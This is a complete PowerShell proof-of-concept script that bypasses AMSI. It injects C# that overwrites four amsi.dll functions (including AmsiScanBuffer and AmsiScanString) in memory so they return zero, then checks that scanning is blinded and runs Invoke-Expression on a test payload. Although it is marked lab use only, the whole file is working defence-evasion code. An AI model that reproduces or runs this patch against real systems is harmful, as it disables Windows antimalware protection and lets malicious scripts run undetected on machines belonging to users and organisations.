#requires -Version 5.1
<#
.SYNOPSIS
    AMSI Bypass verification PoC - injects C# patcher into current PowerShell session
.NOTES
    Lab use only. Defender exclusions must cover this project folder.
#>

Write-Host "=== AMSI Bypass Verification (PowerShell session) ===" -ForegroundColor Cyan
Write-Host ""

# Step 1: Inline C# patcher
Write-Host "[*] Step 1: Loading inline C# patcher..." -ForegroundColor Yellow
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public static class Amsi
{
    [DllImport("amsi.dll", EntryPoint = "AmsiInitialize", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
    public static extern int Initialize(string appName, ref IntPtr amsiContext);

    [DllImport("amsi.dll", EntryPoint = "AmsiUninitialize", CallingConvention = CallingConvention.StdCall)]
    public static extern void Uninitialize(IntPtr amsiContext);

    [DllImport("amsi.dll", EntryPoint = "AmsiOpenSession", CallingConvention = CallingConvention.StdCall)]
    public static extern int OpenSession(IntPtr amsiContext, ref IntPtr amsiSession);

    [DllImport("amsi.dll", EntryPoint = "AmsiCloseSession", CallingConvention = CallingConvention.StdCall)]
    public static extern void CloseSession(IntPtr amsiContext, IntPtr amsiSession);

    [DllImport("amsi.dll", EntryPoint = "AmsiScanString", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
    public static extern int ScanString(IntPtr amsiContext, string stringBuffer, string contentName, IntPtr amsiSession, out int result);
}

public static class AmsiPatcher
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    private static readonly byte[] Patch_ReturnZero = new byte[] { 0x33, 0xC0, 0xC3 };

    public static string Execute()
    {
        try
        {
            IntPtr amsiModule = LoadLibrary("amsi.dll");
            if (amsiModule == IntPtr.Zero)
                return "FAIL: amsi.dll not loaded";

            string[] funcs = new string[] { "AmsiInitialize", "AmsiOpenSession", "AmsiScanString", "AmsiScanBuffer" };
            foreach (string fn in funcs)
            {
                IntPtr pFunc = GetProcAddress(amsiModule, fn);
                if (pFunc == IntPtr.Zero)
                    return string.Format("FAIL: {0} not found", fn);

                uint oldProtect;
                if (!VirtualProtect(pFunc, (UIntPtr)8, 0x40, out oldProtect))
                    return string.Format("FAIL: VirtualProtect {0}", fn);

                Marshal.Copy(Patch_ReturnZero, 0, pFunc, Patch_ReturnZero.Length);
            }
            return "OK: 4 AMSI functions patched in current PowerShell process";
        }
        catch (Exception ex)
        {
            return string.Format("FAIL: {0}", ex.Message);
        }
    }
}
"@

# Step 2: Verify AMSI works BEFORE patch
Write-Host ""
Write-Host "[*] Step 2: Test AMSI BEFORE patch (should be DETECTED or HR_FAIL)" -ForegroundColor Yellow
try {
    $amsiContext = [IntPtr]::Zero
    $amsiSession = [IntPtr]::Zero
    [void][Amsi]::Initialize("PowerShellTest", [ref]$amsiContext)
    [void][Amsi]::OpenSession($amsiContext, [ref]$amsiSession)
    $result = 0
    [void][Amsi]::ScanString($amsiContext, "Invoke-Expression 'Write-Host pwned'", "Test", $amsiSession, [ref]$result)
    Write-Host "    BEFORE patch: AmsiScanString result = $result (0 = CLEAN, 1 = NOT_DETECTED, 32768+ = DETECTED)" -ForegroundColor Gray
} catch {
    Write-Host "    BEFORE patch exception: $($_.Exception.Message)" -ForegroundColor Red
}
finally {
    if ($amsiSession -ne [IntPtr]::Zero) { [void][Amsi]::CloseSession($amsiContext, $amsiSession) }
    if ($amsiContext -ne [IntPtr]::Zero) { [void][Amsi]::Uninitialize($amsiContext) }
}

# Step 3: Apply patch in current PowerShell process
Write-Host ""
Write-Host "[*] Step 3: Applying AMSI patch in CURRENT PowerShell process..." -ForegroundColor Yellow
$patchResult = [AmsiPatcher]::Execute()
Write-Host "    Result: $patchResult" -ForegroundColor $(if ($patchResult.StartsWith("OK")) { "Green" } else { "Red" })

if (-not $patchResult.StartsWith("OK")) {
    Write-Host ""
    Write-Host "[-] Patch failed. Cannot continue verification." -ForegroundColor Red
    exit 1
}

# Step 4: Verify AMSI is now bypassed
Write-Host ""
Write-Host "[*] Step 4: Test AMSI AFTER patch (should be BYPASSED, no DETECTED verdict)" -ForegroundColor Yellow
try {
    $amsiContext = [IntPtr]::Zero
    $amsiSession = [IntPtr]::Zero
    [void][Amsi]::Initialize("PowerShellTest", [ref]$amsiContext)
    [void][Amsi]::OpenSession($amsiContext, [ref]$amsiSession)
    $result = 0
    [void][Amsi]::ScanString($amsiContext, "Invoke-Expression 'Write-Host pwned'", "Test", $amsiSession, [ref]$result)
    Write-Host "    AFTER patch:  AmsiScanString result = $result (should NOT be 32768+)" -ForegroundColor Gray
} catch {
    Write-Host "    AFTER patch exception: $($_.Exception.Message)" -ForegroundColor Red
}
finally {
    if ($amsiSession -ne [IntPtr]::Zero) { [void][Amsi]::CloseSession($amsiContext, $amsiSession) }
    if ($amsiContext -ne [IntPtr]::Zero) { [void][Amsi]::Uninitialize($amsiContext) }
}

# Step 5: REAL verification - try to execute malicious code
Write-Host ""
Write-Host "[*] Step 5: REAL verification - execute Invoke-Expression with malicious payload" -ForegroundColor Yellow
Write-Host "    (If AMSI bypass works, this will print 'BYPASSED'. If AMSI blocks, it will throw.)" -ForegroundColor Gray
try {
    $payload = "Write-Host 'BYPASSED: Invoke-Expression executed successfully' -ForegroundColor Green"
    Invoke-Expression $payload
    Write-Host ""
    Write-Host "[+] VERIFICATION SUCCESSFUL: Malicious code executed despite AMSI presence" -ForegroundColor Green
} catch {
    Write-Host "    [-] EXCEPTION: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "    (AMSI may have blocked the script)" -ForegroundColor Red
}

Write-Host ""
Write-Host "=== End of PoC ===" -ForegroundColor Cyan